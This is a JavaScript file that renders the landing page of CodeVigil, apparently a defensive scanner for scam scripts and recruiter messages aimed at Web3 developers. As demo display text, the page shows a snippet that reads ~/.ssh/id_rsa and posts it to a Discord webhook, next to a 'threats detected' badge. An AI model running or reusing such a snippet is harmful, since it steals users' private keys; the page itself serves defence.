/**
 * CodeVigil — Landing Page
 * In-depth project overview acting as the public homepage
 */

export function renderLandingPage() {
  return `
    <div class="landing-page">
      <!-- Hero Section -->
      <section class="hero-section text-center" style="padding: 80px 20px; border-bottom: 1px solid var(--border-subtle);">
        <div class="hero-icon mb-lg" style="font-size: 4rem; animation: float 6s ease-in-out infinite;">🛡️</div>
        <h1 class="heading-lg" style="font-size: 3.5rem; line-height: 1.1; margin-bottom: 24px; background: linear-gradient(135deg, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
          Don't Run That Code.
        </h1>
        <p class="text-secondary" style="font-size: 1.25rem; max-width: 600px; margin: 0 auto 40px;">
          The ultimate security platform for Web3 developers. Scan suspicious scripts, detect social engineering attacks, and report malicious actors to our community database.
        </p>
        <div class="flex justify-center gap-md">
          <button class="btn btn--primary btn--lg" onclick="location.hash='#/dashboard'" style="font-size: 1.1rem; padding: 14px 28px;">
            🚀 Launch App
          </button>
          <button class="btn btn--ghost btn--lg" onclick="document.getElementById('features').scrollIntoView({behavior: 'smooth'})" style="font-size: 1.1rem; padding: 14px 28px;">
            Learn More ↓
          </button>
        </div>
      </section>

      <!-- The Problem Section -->
      <section class="problem-section" style="padding: 80px 20px; background: rgba(0, 240, 255, 0.02);">
        <div style="max-width: 800px; margin: 0 auto;">
          <h2 class="heading-lg mb-md text-center">Web3 is a Minefield 💣</h2>
          <p class="text-secondary mb-lg text-center" style="font-size: 1.1rem; line-height: 1.6;">
            Scammers are targeting developers with fake job offers, fake collaboration requests, and malicious npm packages. A single copy-paste of a script can drain your wallet, steal your SSH keys, and compromise your entire system.
          </p>
          <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 24px;">
            <div class="card card--danger">
              <div style="font-size: 2rem; margin-bottom: 12px;">🎭</div>
              <h3 class="heading-sm mb-sm">Social Engineering</h3>
              <p class="text-muted" style="font-size: 0.9rem;">Fake recruiters promising $200k+ salaries to lure you into running their "coding test" repositories.</p>
            </div>
            <div class="card card--danger">
              <div style="font-size: 2rem; margin-bottom: 12px;">📂</div>
              <h3 class="heading-sm mb-sm">Wallet Drainers</h3>
              <p class="text-muted" style="font-size: 0.9rem;">Scripts silently reading your <code>.metamask</code>, <code>.phantom</code>, and <code>.env</code> files to steal your private keys.</p>
            </div>
            <div class="card card--danger">
              <div style="font-size: 2rem; margin-bottom: 12px;">⚡</div>
              <h3 class="heading-sm mb-sm">Hidden Payloads</h3>
              <p class="text-muted" style="font-size: 0.9rem;">Obfuscated <code>eval()</code> and Base64 encoded strings executing reverse shells on your machine.</p>
            </div>
          </div>
        </div>
      </section>

      <!-- Features Section -->
      <section id="features" class="features-section" style="padding: 80px 20px; border-bottom: 1px solid var(--border-subtle);">
        <div style="max-width: 1000px; margin: 0 auto;">
          <h2 class="heading-lg mb-xl text-center">How CodeVigil Protects You</h2>
          
          <div class="feature-row" style="display: flex; gap: 40px; align-items: center; justify-content: space-between; margin-bottom: 80px; flex-wrap: wrap;">
            <div style="flex: 1; min-width: 300px;">
              <h3 class="heading-md mb-sm">🔍 Instant Code Scanner</h3>
              <p class="text-secondary mb-md">Paste any JS, Python, or shell script. Our engine scans it locally against 40+ known malicious patterns. We identify code execution risks, network exfiltration, and wallet file access.</p>
              <ul class="text-muted" style="list-style: none; padding: 0; line-height: 2;">
                <li>✓ Detects Base64 & Hex Obfuscation</li>
                <li>✓ Flags <code>child_process</code> and Reverse Shells</li>
                <li>✓ Identifies Discord/Telegram Webhook Exfiltration</li>
              </ul>
            </div>
            <div style="flex: 1; min-width: 300px; background: #0f1423; padding: 20px; border-radius: var(--radius-md); border: 1px solid var(--border-subtle);">
              <pre style="font-family: var(--font-mono); font-size: 0.85rem; color: #a9b5cc;">
<span style="color: var(--cyan);">const</span> fs = require(<span style="color: var(--green);">'fs'</span>);
<span style="color: var(--cyan);">const</span> d = fs.readFileSync(<span style="color: var(--green);">'~/.ssh/id_rsa'</span>);
fetch(<span style="color: var(--green);">'https://discord.com/api/webhooks/...'</span>, {
  method: <span style="color: var(--green);">'POST'</span>,
  body: JSON.stringify({ content: d })
});</pre>
              <div class="mt-sm" style="background: rgba(255,51,102,0.1); border: 1px solid rgba(255,51,102,0.3); padding: 8px 12px; border-radius: 4px; color: var(--red); font-size: 0.85rem; display: flex; align-items: center; gap: 8px;">
                <span>⚠️</span> 2 CRITICAL THREATS DETECTED
              </div>
            </div>
          </div>

          <div class="feature-row" style="display: flex; gap: 40px; align-items: center; justify-content: space-between; margin-bottom: 80px; flex-wrap: wrap; flex-direction: row-reverse;">
            <div style="flex: 1; min-width: 300px;">
              <h3 class="heading-md mb-sm">💬 Message Analyzer</h3>
              <p class="text-secondary mb-md">Not sure if that Telegram DM is legit? Paste it into our Analyzer. We look for classic social engineering red flags to save you from wasting time on scammers.</p>
              <ul class="text-muted" style="list-style: none; padding: 0; line-height: 2;">
                <li>✓ Detects artificial urgency & pressure tactics</li>
                <li>✓ Flags unrealistic compensation ($200k+/yr)</li>
                <li>✓ Identifies requests to run unaudited code</li>
              </ul>
            </div>
            <div style="flex: 1; min-width: 300px;" class="card">
              <div style="display: flex; gap: 12px; align-items: flex-start;">
                <div style="font-size: 2rem;">📩</div>
                <div>
                  <p style="font-weight: 600; margin-bottom: 4px;">Recruiter Bob</p>
                  <p style="font-size: 0.9rem; color: var(--text-secondary);">We are hiring for $250k/year! Please clone our repo and run <code>npm start</code> right now to complete the test.</p>
                </div>
              </div>
            </div>
          </div>

          <div class="feature-row" style="display: flex; gap: 40px; align-items: center; justify-content: space-between; flex-wrap: wrap;">
            <div style="flex: 1; min-width: 300px;">
              <h3 class="heading-md mb-sm">📡 Community Scam Database</h3>
              <p class="text-secondary mb-md">Search our crowdsourced database before engaging with a project. Look up wallet addresses, GitHub repos, and Telegram handles.</p>
              <button class="btn btn--primary" onclick="location.hash='#/dashboard'">Search Database →</button>
            </div>
            <div style="flex: 1; min-width: 300px;">
              <div class="card card--static mb-sm">
                <span class="badge badge--high mb-xs">HIGH</span>
                <p style="font-weight: 600;">Fake Arbitrum Airdrop</p>
                <span class="id-tag mt-sm">0x9dE2...7cF3</span>
              </div>
              <div class="card card--static">
                <span class="badge badge--critical mb-xs">CRITICAL</span>
                <p style="font-weight: 600;">Malicious npm package (colors-js-fake)</p>
                <span class="id-tag mt-sm">github.com/scammer/colors</span>
              </div>
            </div>
          </div>

        </div>
      </section>

      <!-- Footer CTA -->
      <section class="footer-cta text-center" style="padding: 100px 20px;">
        <h2 class="heading-lg mb-sm">Ready to secure your workflow?</h2>
        <p class="text-secondary mb-lg">Join the community and start scanning today. It's completely free and runs 100% locally in your browser.</p>
        <button class="btn btn--primary btn--lg" onclick="location.hash='#/dashboard'" style="font-size: 1.2rem; padding: 16px 32px;">
          Launch CodeVigil App
        </button>
      </section>
    </div>
  `;
}
